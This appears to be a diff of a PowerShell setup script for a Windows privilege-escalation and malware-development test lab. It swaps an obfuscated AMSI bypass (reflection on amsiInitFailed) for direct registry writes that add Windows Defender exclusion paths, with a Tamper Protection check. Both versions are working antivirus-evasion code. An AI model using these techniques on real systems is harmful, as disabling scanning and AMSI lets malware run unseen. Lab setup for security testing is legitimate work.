@@ -116,38 +116,34 @@ if (Test-Path $victimLog) {
 Write-Host "[+] privesc target ready: lowuser -> /Run task -> victim.exe (SYSTEM) -> LoadLibrary(hijackme.dll)"
 
 # 7. Defender exclusions for the test paths.
-#    Add-MpPreference triggers AMSI's signature blocklist on a clean
-#    invocation -- "Add-MpPreference -ExclusionPath" is exactly the
-#    string Defender heuristics flag (canonical malware behaviour).
-#    Bypass via the well-known AmsiUtils reflection trick: flip the
-#    private static `amsiInitFailed` field to $true so subsequent
-#    AMSI checks short-circuit. String literals are obfuscated via
-#    concatenation so the bypass itself doesn't trip a string scan.
-Write-Host "[+] applying AMSI bypass for Defender exclusion API..."
+#    Direct registry write under
+#    HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths --
+#    avoids both Add-MpPreference (AMSI signature blocklist) AND
+#    the AmsiUtils reflective bypass (also signature-flagged in
+#    modern Defender). The registry path needs admin + no Tamper
+#    Protection; check TP first, surface diagnostics either way.
+$tpEnabled = $false
 try {
-    $a = 'System.Management.Automation.A' + 'msiUtils'
-    $t = [Ref].Assembly.GetType($a)
-    $f = $t.GetField('amsi' + 'InitFailed', 'NonPublic,Static')
-    $f.SetValue($null, $true)
-    Write-Host "[+] AMSI: amsiInitFailed flipped"
+    $tpEnabled = (Get-MpComputerStatus).IsTamperProtected
 } catch {
-    Write-Host "[!] AMSI bypass failed (continuing -- exclusion may be blocked): $($_.Exception.Message)"
+    Write-Host "[!] Get-MpComputerStatus failed: $($_.Exception.Message)"
 }
+Write-Host "[i] TamperProtection enabled: $tpEnabled"
 
-# Now safe to add the exclusions (AMSI scan short-circuits).
-try {
-    Add-MpPreference -ExclusionPath $VulnDir, $MarkerDir, 'C:\Users\Public\maldev' -ErrorAction Stop
-    Write-Host "[+] Defender exclusions added: $VulnDir, $MarkerDir, C:\Users\Public\maldev"
-} catch {
-    Write-Host "[!] Add-MpPreference failed: $($_.Exception.Message)"
-    Write-Host "    falling back to registry-direct write (Tamper Protection may block)"
-    $regBase = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'
-    foreach ($p in @($VulnDir, $MarkerDir, 'C:\Users\Public\maldev')) {
-        try {
-            New-ItemProperty -Path $regBase -Name $p -Value 0 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
-            Write-Host "    [+] reg exclusion: $p"
-        } catch {
-            Write-Host "    [!] reg exclusion failed for $p : $($_.Exception.Message)"
-        }
+$regBase = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'
+$paths = @($VulnDir, $MarkerDir, 'C:\Users\Public\maldev')
+$ok = 0
+foreach ($p in $paths) {
+    try {
+        New-ItemProperty -Path $regBase -Name $p -Value 0 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
+        Write-Host "[+] reg exclusion: $p"
+        $ok++
+    } catch {
+        Write-Host "[!] reg exclusion failed for $p : $($_.Exception.Message)"
     }
+}
+if ($ok -lt $paths.Length -and $tpEnabled) {
+    Write-Host "[!] some exclusions blocked AND Tamper Protection is ON --"
+    Write-Host "    real-world bypass would require disabling TP via Settings UI"
+    Write-Host "    or InTune policy (cannot be done programmatically by design)."
 }
